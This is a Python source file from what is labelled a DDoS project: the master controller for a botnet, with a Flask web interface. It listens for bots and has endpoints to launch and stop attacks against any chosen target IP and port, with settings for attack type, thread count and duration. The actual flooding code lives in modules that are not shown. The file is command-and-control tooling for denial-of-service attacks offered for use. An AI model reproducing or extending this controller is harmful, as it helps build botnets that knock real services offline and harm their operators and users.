# Proyecto DDoS: master.py (inicia servidor, gestiona bots y web UI)
import threading
import time
import socket
from flask import Flask, render_template, request, jsonify
from bots import BotManager
from attacks import AttackManager
from utils import send_message

app = Flask(__name__)

bot_manager = BotManager()
attack_manager = AttackManager(bot_manager)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status')
def status():
    return jsonify(bot_manager.get_status())

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    result = attack_manager.start_attack(
        attack_type=data['attack_type'],
        target_ip=data['target_ip'],
        target_port=int(data['target_port']),
        threads=int(data['threads']),
        duration=int(data['duration'])
    )
    return jsonify(result)

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    result = attack_manager.stop_attack()
    return jsonify(result)

@app.route('/last_result')
def last_result():
    return jsonify(attack_manager.get_last_result())

@app.route('/live_metrics')
def live_metrics():
    return jsonify(attack_manager.get_live_metrics())

def start_master():
    threading.Thread(target=bot_manager.listen_for_bots, daemon=True).start()
    threading.Thread(target=bot_manager.update_status_loop, daemon=True).start()
    threading.Thread(target=attack_manager.listen_for_stats, daemon=True).start()
    app.run(debug=False, port=5000, use_reloader=False)

if __name__ == '__main__':
    start_master()
